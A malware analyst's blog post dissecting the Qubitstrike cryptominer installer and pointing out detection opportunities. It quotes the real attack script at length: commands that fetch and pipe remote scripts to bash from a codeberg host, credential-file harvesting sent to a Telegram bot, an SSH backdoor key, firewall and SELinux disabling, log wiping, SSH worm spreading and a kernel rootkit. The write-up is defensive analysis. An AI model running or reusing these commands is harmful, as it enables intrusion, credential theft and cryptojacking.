---
title: "Qubitstrike: Linux kernel rootkits go mainstream"
date: 2023-10-21
---
Earlier this week, I stumbled into [Cado's report on Qubitstrike](https://www.cadosecurity.com/qubitstrike-an-emerging-malware-campaign-targeting-jupyter-notebooks/), an attack on publicly accessible [Jupyter notebook](https://jupyter.org/) installations. Unlike most security reports, the hosted malware files were still available, which meant I could analyze and validate our defenses against it. Normally, I don't get this opportunity to study emerging threats, as I'm not paying the $20,000/yr paywall fee for access to Google's VirusTotal service that most researchers seem to rely on.

![](KuU2dMIe.webp)

<!--more-->

I really like QubitStrike: it has a bit of everything and is easy to dissect. The most exciting thing about it is that it's the first example I've seen of casual attackers employing a kernel rootkit that actually works on the latest versions of popular Linux distributions. Let's take a tour!

## The Qubitstrike Installer

If you ever wanted to study how your modern malware installer operates on Linux, the Qubitstrike installer script is the perfect case study for you - it's like a tasting tour of UNIX malware techniques in a single easy-to-read shell script.

* Two Linux rootkits (kernel and user-mode)
* Process hiding
* Credential theft
* An SSH backdoor
* A viral component
* A cryptocurrency miner
* Telegram integration

To follow along, I've posted a copy of the original installer script here: [mi.sh](https://github.com/tstromberg/malware-menagerie/blob/main/linux/2023.Trojan_Miner.QubitStrike/installer/mi.sh). If you want to test the installer yourself within a VM, I've made a defanged copy of it that works without downloading content from codeberg: [local-mi.sh](https://github.com/tstromberg/malware-menagerie/blob/main/linux/2023.Trojan_Miner.QubitStrike/local_installer/local-mi.sh)

### Installer Initialization

```shell
miner_url="https://codeberg.org/m4rt1/sh/raw/branch/main/xm64.tar.gz"
miner_name="python-dev"
killer_url="https://codeberg.org/m4rt1/sh/raw/branch/main/killer.sh"
kill_url2="https://codeberg.org/m4rt1/sh/raw/branch/main/kill_loop.sh"
pool="pool.hashvault.pro:80"
MD5="199b790d05724170f3e6583500799db1"
DIR="/usr/share/.LQvKibDTq4"
RSA="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV+S/3d5qwXg1yvfOm3ZTHqyE2F0zfQv1g12Wb7H4N5EnP1m8WvBOQKJ2htWqcDg2dpweE7htcRsHDxlkv2u+MC0g1b8Z/HawzqY2Z5FH4LtnlYq1QZcYbYIPzWCxifNbHPQGexpT0v/e6z27NiJa6XfE0DMpuX7lY9CVUrBWylcINYnbGhgSDtHnvSspSi4Qu7YuTnee3piyIZhN9m+tDgtz+zgHNVx1j0QpiHibhvfrZQB+tgXWTHqUazwYKR9td68twJ/K1bSY+XoI5F0hzEPTJWoCl3L+CKqA7gC3F9eDs5Kb11RgvGqieSEiWb2z2UHtW9KnTKTRNMdUNA619/5/HAsAcsxynJKYO7V/ifZ+ONFUMtm5oy1UH+49ha//UPWUA6T6vaeApzyAZKuMEmFGcNR3GZ6e8rDL0/miNTk6eq3JiQFR/hbHpn8h5Zq9NOtCoUU7lOvTGAzXBlfD5LIlzBnMA3EpigTvLeuHWQTqNPEhjYNy/YoPTgBAaUJE= root@kali"
[[ $EUID -eq 0 ]] || DIR="/tmp/.LQvKibDTq4" ;
```

Even the initialization part of the script contains multiple detection opportunities, as the following things are highly irregular to find in executables or shell scripts:

* References to `codeberg.org/.*/raw/`
* References to `hashvault` or `miner_`
* References to hidden `/usr/share` and `/tmp` directories
* SSH keys

### Fetch Tools

![](jsHYhB4p.png)

I'm now going to show the installer output in [debug mode (using `bash -x)`](https://tldp.org/LDP/Bash-Beginners-Guide/html/sect_02_03.html), as it usually makes the behavior easier to discern. If you are on a Linux distro that has "apt", "yum", or "apk" package manager available, the script will install curl or wget for you:

```shell
---------------------------------------
 INSTALLING WGET, CURL ...
---------------------------------------
+ type apt
+ apt-get update --fix-missing
Hit:1 http://archive.ubuntu.com/ubuntu lunar InRelease                   
Hit:2 http://security.ubuntu.com/ubuntu lunar-security InRelease         
Hit:3 http://archive.ubuntu.com/ubuntu lunar-updates InRelease           
Hit:4 http://archive.ubuntu.com/ubuntu lunar-backports InRelease
Reading package lists... Done
+ apt-get install wget curl -y
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
wget is already the newest version (1.21.3-1ubuntu1).
curl is already the newest version (7.88.1-8ubuntu2.3).
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
```

A script or executable containing "apt-get install wget curl -y" is probably malware, so it's not a bad thing to alert on. Once a fetch tool is installed, it moves it to a new location to break future attackers, as well as bypass detection queries that look for `wget` or `curl`:

```shell
---------------------------------------
 Replacing WGET, CURL ...
---------------------------------------
+ sleep 1s
+ [[ -f /usr/bin/wget ]]
+ mv /usr/bin/wget /usr/bin/zget
+ [[ -f /usr/bin/curl ]]
+ mv /usr/bin/curl /usr/bin/zurl
+ [[ -f /bin/wget ]]
+ [[ -f /bin/curl ]]
++ command -v zget
+ [[ -x /usr/bin/zget ]]
+ req='zget -q -O -'
+ DLr='zget -O'
```

Then we use the newly renamed fetch tool to query for our Internet IP using [ifconfig.me](https://ifconfig.me/). The script later uses this value as a client ID:

```
++ zget -q -O - ifconfig.me
+ client=136.54.68.146
```

### The "restart" argument

Curiously, the installer supports a `restart` argument, which provides a handy way to re-set up an infected host. It also gives you a starting point to sort out how to clean up an infected host, though it doesn’t seem to do anything about the kernel rootkit or other system-level changes:

```
    chattr -R -i /usr/share/.LQvKibDTq4/
    rm -rf /usr/share/.LQvKibDTq4/
    rm -rf /tmp/.LQvKibDTq4/
    rm -rf /usr/share/.28810
    rm -rf /etc/cron.d/netns
    chattr -i /etc/ld.so.preload
    chattr -i /usr/local/lib/libnetresolv.so
    rm -rf /usr/local/lib/libnetresolv.so /etc/ld.so.preload
    pkill -f python-dev
    pkill python-dev
    killall python-dev
    mkdir -p $DIR
    start
```

### Begin Disable Security

Now things get serious, as the malware begins by actively degrading the security posture of the Linux host:

```shell
---------------------------------------
 Begin disable security 
---------------------------------------
+ cover
+ iptables -F
+ systemctl stop firewalld
+ systemctl disable firewalld
```

At this point, it has flushed all existing iptables firewall rules and killed off the [firewalld firewall manager](https://firewalld.org/) (used mainly by Red Hat). Next, the script increases the file descriptor count from a typical value of 1024 to 65535 for reasons I'm not quite sure of.

```shell
+ ulimit -n 65535
```

Then, it begins disabling the shell command history. First, by hiding all commands that begin with a with a " " character:

```shell
+ HISTCONTROL=ignorespace
```

![](qkVrmeCD.jpg)

HISTCONTROL=ignorespace is an entirely new feature to me ([why does it even exist?](https://unix.stackexchange.com/questions/115934/why-does-bash-have-a-histcontrol-ignorespace-option)). The script then disables the history file altogether via a variety of mechanisms, making that setting useless anyways.

```
+ export HISTFILE=/dev/null
+ unset HISTFILE
+ shopt -ou history
+ set +o history
+ HISTSIZE=0
```

If you are not already alerting on programs executing with these HIST\* values, you should begin today. These values are rarely seen outside of malware, particularly HISTFILE=/dev/null. Next, the installer disables SELinux, which should be causing alarms to go off:

```
+ setenforce 0
+ echo SELINUX=disabled
```

Next, Qubitstrike disables the Linux kernel [NMI watchdog](https://medium.com/@yildirimabdrhm/nmi-watchdog-on-linux-ae3b4c86e8d8) for what I have to assume are performance reasons - as it decreases the amount of non-maskable interrupts on the system. Perhaps it also decreases the chances that the host will reboot due to a misbehaving crypto miner:

```
+ sysctl kernel.nmi_watchdog=0
+ sysctl kernel.nmi_watchdog=0
+ echo '0' >/proc/sys/kernel/nmi_watchdog
+ echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
```

More detection opportunities: calls to sysctl, edits to /proc/sys/kernel, and edits to /etc/sysctl.conf. The next thing the installer does in its preparation is modify the system's DNS resolvers. This is a great way to bypass malware detection that requires a local or custom DNS server and improve reliability if the system does not have a stable DNS server defined.

```
grep -q 8.8.8.8 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.8.8" >> /etc/resolv.conf;
grep -q 8.8.4.4 /etc/resolv.conf || chattr -i /etc/resolv.conf 2>/dev/null 1>/dev/null; echo "nameserver 8.8.4.4" >> /etc/resolv.conf;
```

### Squeezing out the competition

![](kSYk4Avb.webp)

The firewall rules are reprogrammed to drop packets to and from competing miners:

```shell
    iptables -A OUTPUT -p tcp --dport 3333 -j DROP > /dev/null 2>&1
    iptables -A OUTPUT -p tcp --dport 5555 -j DROP > /dev/null 2>&1
    iptables -A OUTPUT -p tcp --dport 7777 -j DROP > /dev/null 2>&1
    iptables -A OUTPUT -p tcp --dport 9999 -j DROP > /dev/null 2>&1
    iptables -A INPUT -s xmr.crypto-pool.fr -j DROP > /dev/null 2>&1
    iptables -A OUTPUT -p tcp --dport 10343 -j DROP > /dev/null 2>&1
    iptables -A OUTPUT -p tcp --dport 10300 -j DROP > /dev/null 2>&1
```

To further squeeze out the competition, Qubitstrike then begins killing off any process that consumes more than 99% CPU, as well as nuking known miner processes by name:

```shell
proc_kl() {
  # KILL any bproc with 99% CPU
  ps aux | grep -vw python-dev | awk '{if($3>99.0) print $2}' | while read procid
  do
    kill -9 $procid
  done

  chattr -i etc/ld.so.preload > /dev/null 2>&1
  rm -rf /etc/ld.so.preload > /dev/null 2>&1

  list1=(\.Historys neptune xm64 xmrig suppoieup '*.jpg' '*.jpeg' '/tmp/*.jpg' '/tmp/*/*.jpg' '/tmp/*.xmr' '/tmp/*xmr' '/tmp/*/*xmr' '/tmp/*/*/*xmr' '/tmp/*nanom' '/tmp/*/*nanom' '/tmp/*dota' '/tmp/dota*' '/tmp/*/dota*' '/tmp/*/*/dota*','chron-34e2fg')

  list2=(xmrig xm64 xmrigDaemon nanominer lolminer JavaUpdate donate python3.2 sourplum dota3 dota)

  list3=('/tmp/sscks' './crun' ':3333' ':5555' 'log_' 'systemten' 'netns' 'voltuned' 'darwin' '/tmp/dl' '/tmp/ddg' '/tmp/pprt' '/tmp/ppol' '/tmp/65ccE' '/tmp/jmx*' '/tmp/xmr*' '/tmp/nanom*' '/tmp/rainbow*' '/tmp/*/*xmr' 'http_0xCC030' 'http_0xCC031' 'http_0xCC033' 'C4iLM4L' '/boot/vmlinuz' 'nqscheduler' '/tmp/java' 'gitee.com' 'kthrotlds' 'ksoftirqds' 'netdns' 'watchdogs' '/dev/shm/z3.sh' 'kinsing' '/tmp/l.sh' '/tmp/zmcat' '/tmp/udevd' 'sustse' 'mr.sh' 'mine.sh' '2mr.sh' 'cr5.sh' 'luk-cpu' 'ficov' 'he.sh' 'miner.sh' 'nullcrew' 'xmrigDaemon' 'xmrig' 'lolminer' 'xmrigMiner' 'xiaoyao' 'kernelcfg' 'xiaoxue' 'kernelupdates' 'kernelupgrade'  '107.174.47.156' '83.220.169.247' '51.38.203.146' '144.217.45.45' '107.174.47.181' '176.31.6.16' 'mine.moneropool.com' 'pool.t00ls.ru' 'xmr.crypto-pool.fr:8080' 'xmr.crypto-pool.fr:3333' 'zhuabcn@yahoo.com' 'monerohash.com' 'xmr.crypto-pool.fr:6666' 'xmr.crypto-pool.fr:7777' 'xmr.crypto-pool.fr:443' 'stratum.f2pool.com:8888' 'xmrpool.eu')

  list4=(kworker34 kxjd libapache Loopback lx26 mgwsl minerd minexmr mixnerdx mstxmr nanoWatch nopxi NXLAi performedl polkitd pro.sh pythno qW3xT.2 sourplum stratum sustes wnTKYg XbashY XJnRj xmrig xmrigDaemon xmrigMiner ysaydh zigw lolm nanom nanominer lolminer)

  if type killall > /dev/null 2>&1; then
    for k1 in "${list1[@]}" ; do killall $k1 ; done
  fi

  for k2 in "${list2[@]}" ; do pgrep $k2 | xargs -I % kill -9 % ; done
  for k3 in "${list3[@]}" ; do ps auxf | grep -v grep | grep $k3 | awk '{print $2}' | xargs -I % kill -9 % ; done
  for k4 in "${list4[@]}" ; do pkill -f $k4 ; done
}
```

If you are looking for crypto miners, that's a good list of unusual processes and command-line strings to watch for! Next, the installer kills off any process with an outgoing connection to what are likely standard miner ports, but 143 ([IMAP](https://datatracker.ietf.org/doc/html/rfc3501)), 3389 ([Remote Desktop](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol)), and 6667 ([ircd](https://en.wikipedia.org/wiki/IRCd)) stand out to me.

```shell
list=(':1414' '127.0.0.1:52018' ':143' ':3389' ':4444' ':5555' ':6666' ':6665' ':6667' ':7777'  ':3347' ':14444' ':14433' ':13531' ':15001' ':15002')
for k in "${list[@]}" ; do netstat -anp | grep $k | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 % ; done
netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '108.174.197.76' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '192.236.161.6' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
netstat -antp | grep '88.99.242.92' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
```

## Makin' $$$ with XMRig

The install script increases the number of [hugepages](https://wiki.debian.org/Hugepages) (typically 0) to 128. I’m most familiar with this optimization for things like Oracle Databases, but it also allegedly offers a [20-30% boost for some types of cryptocurrency mining](https://xmrig.com/docs/miner/hugepages). 

```shell
---------------------------------------
 setup hugepages 
---------------------------------------
+ hugepages
+ sysctl -w vm.nr_hugepages=128
vm.nr_hugepages = 128
+ echo vm.nr_hugepages=128 > /etc/sysctl.conf
```

Any program that references vm.nr_hugepages should be considered a possible crypto miner. For more confirmation, combine it with a check for kernel.nmi_watchdog. 

Once the appropriate sysctl values are set, the script fetches and starts the miner:

```shell
+ zurl -o /usr/share/.LQvKibDTq4/xm.tar.gz https://codeberg.org/m4rt1/sh/raw/branch/main/xm64.tar.gz
+ tar -xf /usr/share/.LQvKibDTq4/xm.tar.gz -C /usr/share/.LQvKibDTq4
+ rm -rf /usr/share/.LQvKibDTq4/xm.tar.gz
+ chmod +x /usr/share/.LQvKibDTq4/config.json /usr/share/.LQvKibDTq4/python-dev
+ /usr/share/.LQvKibDTq4/python-dev -B -o pool.hashvault.pro:80 -u 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo -p 136.54.68.146 --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90
```

Unsurprisingly, the program is [`XMRig`](https://xmrig.com/) - the most popular option for invasive cryptocurrency miners. It's disappointing that the archive only contains an x86_64 binary, but the installer script never checks for the machine architecture. The attacker may have done that step manually within [Jupyter](https://jupyter.org/). It was a nice touch that the script author limited the CPU usage to 90% to avoid detection.

## Installing the backdoor

Rather than implementing its own detectable backdoor, QubitStrike makes the wise decision to use [OpenSSH](https://www.openssh.com/), which is already likely on the system. This works nicely since we already know from the attack profile that the machine is on the Internet, and we've already flushed the firewall that may have prevented external SSH access.

![](l4InqXJW.jpg)

The attacker plugs in their SSH credentials (likely from a [Kali Linux](https://www.kali.org/) machine), disables the [tcpwrapper](https://en.wikipedia.org/wiki/TCP_Wrappers) controls, reconfigures sshd to allow remote root login, and starts it up. I'm not sure what the "Port 78" reference is all about, but I assume they are disabling a backdoor configuration from a competing crypto miner.

```shell
---------------------------------------
 SSH setup  
---------------------------------------
+ ssh_get
+ '[' -f /root/.ssh/authorized_keys ']'
+ chattr -aui /root/.ssh/authorized_keys
+ grep -q 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV+S/3d5qwXg1yvfOm3ZTHqyE2F0zfQv1g12Wb7H4N5EnP1m8WvBOQKJ2htWqcDg2dpweE7htcRsHDxlkv2u+MC0g1b8Z/HawzqY2Z5FH4LtnlYq1QZcYbYIPzWCxifNbHPQGexpT0v/e6z27NiJa6XfE0DMpuX7lY9CVUrBWylcINYnbGhgSDtHnvSspSi4Qu7YuTnee3piyIZhN9m+tDgtz+zgHNVx1j0QpiHibhvfrZQB+tgXWTHqUazwYKR9td68twJ/K1bSY+XoI5F0hzEPTJWoCl3L+CKqA7gC3F9eDs5Kb11RgvGqieSEiWb2z2UHtW9KnTKTRNMdUNA619/5/HAsAcsxynJKYO7V/ifZ+ONFUMtm5oy1UH+49ha//UPWUA6T6vaeApzyAZKuMEmFGcNR3GZ6e8rDL0/miNTk6eq3JiQFR/hbHpn8h5Zq9NOtCoUU7lOvTGAzXBlfD5LIlzBnMA3EpigTvLeuHWQTqNPEhjYNy/YoPTgBAaUJE= root@kali' /root/.ssh/authorized_keys
+ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV+S/3d5qwXg1yvfOm3ZTHqyE2F0zfQv1g12Wb7H4N5EnP1m8WvBOQKJ2htWqcDg2dpweE7htcRsHDxlkv2u+MC0g1b8Z/HawzqY2Z5FH4LtnlYq1QZcYbYIPzWCxifNbHPQGexpT0v/e6z27NiJa6XfE0DMpuX7lY9CVUrBWylcINYnbGhgSDtHnvSspSi4Qu7YuTnee3piyIZhN9m+tDgtz+zgHNVx1j0QpiHibhvfrZQB+tgXWTHqUazwYKR9td68twJ/K1bSY+XoI5F0hzEPTJWoCl3L+CKqA7gC3F9eDs5Kb11RgvGqieSEiWb2z2UHtW9KnTKTRNMdUNA619/5/HAsAcsxynJKYO7V/ifZ+ONFUMtm5oy1UH+49ha//UPWUA6T6vaeApzyAZKuMEmFGcNR3GZ6e8rDL0/miNTk6eq3JiQFR/hbHpn8h5Zq9NOtCoUU7lOvTGAzXBlfD5LIlzBnMA3EpigTvLeuHWQTqNPEhjYNy/YoPTgBAaUJE= root@kali'
+ chattr -aui /etc/ssh
+ chattr -aui /etc/ssh/sshd_config /etc/hosts.deny /etc/hosts.allow
+ echo
+ echo
+ mkdir -p /etc/ssh
+ sed -i -e 's/Port 78//g' -e 's/\#Port 22/Port 22/g' -e 's/\#PermitRootLogin/PermitRootLogin/g' -e 's/PermitRootLogin no/PermitRootLogin yes/g' -e 's/PubkeyAuthentication no/PubkeyAuthentication yes/g' -e 's/PasswordAuthentication yes/PasswordAuthentication no/g' /etc/ssh/sshd_config
+ chmod 600 /etc/ssh/sshd_config
+ systemctl restart ssh||service ssh restart||/etc/init.d/ssh restart||/etc/init.d/sshd restart||/etc/rc.d/sshd restart||service sshd restart||scw-fetch-ssh-keys --upgrade
```

### Phoning home

![](7P7847lO.jpg)

Qubitstrike collects some information about the health of the miner and the backdoor and then sends it to a [Telegram](https://telegram.org/) channel:

```shell
+ service ssh status
+ '[' 0 -eq 0 ']'
+ SSH_Ld=true
+ grep python-dev
+ grep -v grep
+ ps aux
root        4088  192  0.1  42216  4768 ?        Ssl  18:24   0:02 /usr/share/.LQvKibDTq4/python-dev -B -o pool.hashvault.pro:80 -u 49qQh9VMzdJTP1XA2yPDSx1QbYkDFupydE5AJAA3jQKTh3xUYVyutg28k2PtZGx8z3P2SS7VWKMQUb9Q4WjZ3jdmHPjoJRo -p 136.54.68.146 --donate-level 1 --tls --tls-fingerprint=420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --max-cpu-usage 90
+ '[' 0 -eq 0 ']'
+ MINER_stat=running
+ DATA_STRING='IP: 136.54.68.146 | WorkDir: /usr/share/.LQvKibDTq4 | User: root | cpu(s): 4 | SSH: true | Miner: running'
+ zurl --silent --insecure --data chat_id=DEFANGED_5531196733 --data disable_notification=false --data parse_mode=html --data 'text=IP: 136.54.68.146 | WorkDir: /usr/share/.LQvKibDTq4 | User: root | cpu(s): 4 | SSH: true | Miner: running' https://api.telegram.org/DEFANGED_bot6245402530:AAHl9IafXHFM3j3aFtCpqbe1g-i0q3Ehblc/sendMessage
```

### Credential Theft

The most disappointing part of the script is how it steals and sends credentials. Their approach is exceptionally slow: It crawls the filesystem separately for each credential type rather than using the find commands native support for finding multiple names. I blame the fin[d command's bizarre syntax and poorly written documentation](https://man7.org/linux/man-pages/man1/find.1.html), as it took me a couple of attempts to get it correct myself. 

![](7Z1S4bxi.png)

```shell
+ CRED_FILE_NAMES=("credentials" "cloud" ".s3cfg" ".passwd-s3fs" "authinfo2" ".s3backer_passwd" ".s3b_config" "s3proxy.conf" "access_tokens.db" "credentials.db" ".smbclient.conf" ".smbcredentials" ".samba_credentials" ".pgpass" "secrets" ".boto" ".netrc" ".git-credentials" "api_key" "censys.cfg" "ngrok.yml" "filezilla.xml" "recentservers.xml" "queue.sqlite3" "servlist.conf" "accounts.xml" "azure.json" "kube-env")
+ for CREFILE in ${CRED_FILE_NAMES[@]}
+ find / -maxdepth 23 -type f -name credentials
+ xargs -I % sh -c 'echo :::%; cat %'
```

Contrary to most credential theft malware, QubitStrike does not attempt to steal credentials for web browsers or wallets - the authors are clearly focused on acquiring more compute resources. I took a look on my own Linux workstation to see what sort of credentials this might pick up and found:

```shell
/home/t/.config/gcloud/legacy_credentials/t@xyz.dev/.boto
/home/t/.config/gcloud/credentials.db
/home/t/.config/gcloud/access_tokens.db
```

After collection, the script sends the credentials home via a second Telegram message:

```shell
++ cat /tmp/creds
+ SECRETS=
+ zurl --silent --insecure --data chat_id=DEFANGED_5531196733 --data disable_notification=false --data parse_mode=html --data text= https://api.telegram.org/DEFANGED_bot6245402530:AAHl9IafXHFM3j3aFtCpqbe1g-i0q3Ehblc/sendMessage
+ cat /tmp/creds
+ rm /tmp/creds
```

Safety reminder: never mount your personal home directory to your malware VMs, as the find command would have traversed filesystems to discover and upload your credentials.

## The kernel-level rootkit: Diamorphine

![](8SIolL5k.png)

Here's where Qubitstrike gets interesting. This is the first time I've seen a casual miner with a Linux rootkit that works on a modern Ubuntu release:

```shell
---------------------------------------
 Begin hiding 
---------------------------------------
+ ex_hid
+ hide1
+ ins_package
+ type apt
+ apt update -qq --fix-missing
46 packages can be upgraded. Run 'apt list --upgradable' to see them.
++ uname -r
+ apt-get install -y -qq gcc make kmod wget net-tools linux-headers-6.2.0-27-generic -o Dpkg::Progress-Fancy=0 -o APT::Color=0 -o Dpkg::Use-Pty=0
...
+BKq2HVGRbshW1jerMuLLi6PyQR7bb3ORyGJqEJJ4oksOHE7f1/... | base64 -d
+ tar -xf /usr/share/.LQvKibDTq4/hf.tar -C /usr/share/.LQvKibDTq4/
+ cd /usr/share/.LQvKibDTq4
+ make
make -C /lib/modules/6.2.0-27-generic/build M=/usr/share/.LQvKibDTq4 modules
make[1]: Entering directory '/usr/src/linux-headers-6.2.0-27-generic'
  CC [M]  /usr/share/.LQvKibDTq4/diamorphine.o
  MODPOST /usr/share/.LQvKibDTq4/Module.symvers
  CC [M]  /usr/share/.LQvKibDTq4/diamorphine.mod.o
  LD [M]  /usr/share/.LQvKibDTq4/diamorphine.ko
  BTF [M] /usr/share/.LQvKibDTq4/diamorphine.ko
Skipping BTF generation for /usr/share/.LQvKibDTq4/diamorphine.ko due to unavailability of vmlinux
+ insmod diamorphine.ko
```

Rather than fetching the rootkit, it cleverly embeds it as a base64 string and decodes it - providing ample detection opportunity. If you ever see a base64 string that begins with `H4sI`, you know you are dealing with a base64-encoded gzip file (another detection hint). Since kernel module binaries are not portable, Qubitstrike installs a compiler and the headers necessary before building the rootkit.

So, what is [Diamorphine](https://github.com/m0nad/Diamorphine)? It's easily the most popular open-source rootkit for Linux. I've long poo-pooed kernel-mode rootkits in Linux as unsupportable due to the constant churn of the Linux kernel, but surprisingly, Diamorphine has been updated to work on modern Linux kernels! It works perfectly on a fully patched Ubuntu 23.04 or 23.10 machine (Linux 6.2.0 & 6.5.3). Diamorphine does segfault on my ArchLinux laptop (Linux 6.5.7), showing that Linux rootkits are still somewhat fragile.

Diamorphine has a unique control mechanism: signals. You can see it in action in Qubitstrike:

```shell
+ echo 'Hiding process ( python-dev ) pid ( 4088 )'
Hiding process ( python-dev ) pid ( 4088 )
+ kill -31 4088
```

How does the process hiding work? Diamorphine intercepts calls to the [getdents64(2)](https://linux.die.net/man/2/getdents64) system call, used in turn by [readdir(3)](https://linux.die.net/man/3/readdir). On Linux, system utilities, such as ps or netstat, read the contents of the `/proc` directory to know what processes or tasks are currently running - this malware will filter out the pid entry for any processes that have been passed signal 31 (the unused [SIGSYS](https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf) signal).

In addition, Diamorphine has an option of hiding any files matching a `MAGIC_PREFIX`. This is commonly used to hide directories, but Qubitstrike does not take advantage of it. Diamorphine also supports other signals, notably  `-64`, which upgrades a process to root access. From [diamorphine.c](https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c):

```c
void
give_root(void) {
...
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
...
}
```

This signals-based mechanism makes Diamorphine easy to detect. Simply iterate over every signal and see what happens! We'll show an example later.

## User-mode rootkit: processhider

If Diamorphine fails to build, QubitStrike falls back to using a modified version of  [github.com/gianlucaborello/libprocesshider/blob/master/processhider.c](https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c) - a user-mode rootkit.

```shell
+ echo I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPHN0ZGlvLmg... | base64 -d
+ sed -i s/procname/python-dev/g /usr/share/.LQvKibDTq4/prochid.c
+ chattr -ia /etc/ld.so.preload /usr/local/lib/
+ gcc -Wall -fPIC -shared -o /usr/local/lib/libnetresolv.so /usr/share/.LQvKibDTq4/prochid.c -ldl
+ echo /usr/local/lib/libnetresolv.so > /etc/ld.so.preload
+ '[' -f /usr/local/lib/libnetresolv.so ']'
+ chattr +i /usr/local/lib/libnetresolv.so
+ chattr +i /etc/ld.so.preload
```

This malware intercepts userland requests to glibc's [`readdir(3)`](https://linux.die.net/man/3/readdir) function. If the name matches `python-dev`, the process is hidden in much the same way as Diamorphine. In the old days, user-mode rootkits were deployed by setting the [`LD_LIBRARY_PATH`](https://www.hpc.dtu.dk/?page_id=1180)` environment variable`, but on Linux, you can get the same result by adding the library path to `/etc/ld.so.preload`.

In 99% of environments, this file shouldn't exist. Check for it.

## Establishing Persistence

![](aArwlOKd.webp)

QubitStrike will establish persistence through cron. First, it grabs the killer script, which shares the same competition killers we saw before, from Codeberg, and installs it to cron:

```shell
+ cron_set
+ killerd=/usr/share/.28810
+ mkdir -p /usr/share/.28810
+ [[ zurl -o != '' ]]
+ zurl -o /usr/share/.28810/kthreadd https://codeberg.org/m4rt1/sh/raw/branch/main/killer.sh
+ chmod +x /usr/share/.28810/kthreadd
+ chattr -R -ia /etc/cron.d
+ echo -e '*/1 * * * * root /usr/share/.28810/kthreadd' > /etc/cron.d/netns
```

It also sets the miner to start on reboot:

```shell
+ echo '@reboot root /usr/share/.LQvKibDTq4/python-dev -c /usr/share/.LQvKibDTq4/config.json' > /etc/cron.d/apache2
```

Once a day, it starts the QubitStrike installer again using the latest code. Since there is no other cron task to reinstall the Diamorphine module, this means there can be up to a full day where the miner is running unhidden. I like how it hedges its bets by using the renamed `zget` or `curl` commands:

```shell
+ echo '@daily root zget -q -O - https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash' > /etc/cron.d/apache2.2
+ echo -e '0 0 */2 * * * root curl https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash'  > /etc/cron.d/netns2
+ echo "0 * * * * wget -O- https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash > /dev/null 2>&1" >> /etc/crontab
+ echo "0 0 */3 * * * $req https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash > /dev/null 2>&1" >> /etc/crontab
+ chattr -R +ia /etc/cron.d
+ chattr -R +i /usr/share/.LQvKibDTq4
```

## The viral component of QubitStrike

![](CV7Rixe9.png)

One of the surprising features of QubitStrike is that it will attempt to replicate itself to any systems it finds in `/root/.ssh/known_hosts`:

```shell
ssh_local() {
if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '$req https://codeberg.org/m4rt1/sh/raw/branch/main/mi.sh | bash >/dev/null 2>&1 &' & done
fi
}
```

To be more effective, the installer should have also parsed other users `known_hosts` files, but perhaps I shouldn't be giving malware authors tips.

## The coup de grace: log truncation

Before exiting the installer, QubitStrike truncates many important system logs:

```shell
logs=(/var/log/wtmp /var/log/secure /var/log/cron /var/log/iptables.log /var/log/auth.log /var/log/cron.log /var/log/httpd /var/log/syslog /var/log/wtmp /var/log/btmp /var/log/lastlog)
  for Lg in "${logs[@]}"; do
    echo 0> $Lg;
  done
```

It does not do anything about truncating systemd logs, though.

## Detecting Qubitstrike from a shell

![](KVms6GJG.png)

On Linux, process hiders are hilariously simple to detect. In my experience, ro rootkits bother to hide all of the /proc lookup points, preferring instead to just hide from the /proc directory list.

My detection technique is to iterate over all possible process ID numbers and check for the existence of /proc/$pid/something file. If it exists, cross-reference it against the directory listing of /proc, and report missing entries. This works swimmingly:

```shell
#!/bin/bash
start=$(date +%s)
for pid in *; do
    visible[$pid]=1
done

for i in $(seq 2 "$(cat /proc/sys/kernel/pid_max)"); do
    [[ ${visible[$i]} = 1 ]] && continue
    [[ ! -e /proc/$i/status ]] && continue
    [[ $(stat -c %Z /proc/$i) -ge $start ]] && continue

    #  pid is a kernel thread
    [[ $(awk '/Tgid/{ print $2 }' "/proc/${i}/status") != "${i}" ]] && continue

